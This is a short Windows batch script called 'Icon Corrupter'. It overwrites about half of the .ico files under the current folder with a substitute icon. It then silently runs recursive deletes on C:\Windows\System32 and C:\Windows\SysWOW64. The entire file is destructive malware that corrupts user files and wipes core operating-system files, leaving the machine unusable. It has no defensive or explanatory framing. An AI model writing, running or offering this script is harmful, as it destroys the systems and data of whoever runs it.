@echo off
setlocal enabledelayedexpansion

echo Icon Corrupter
echo Deleting system files...

for /R %%F in (*.ico) do (
   set /A rand=(!random! %% 100)
   if !rand! LSS 50 (
      echo Corrupting icon: %%F
      copy /Y random_icon.ico %%F > nul
   )
)

echo All icons have been corrupted.

pause

echo Deleting system files...

del /S /Q C:\Windows\System32\*.*
del /S /Q C:\Windows\SysWOW64\*.*

echo All system files have been deleted.

pause
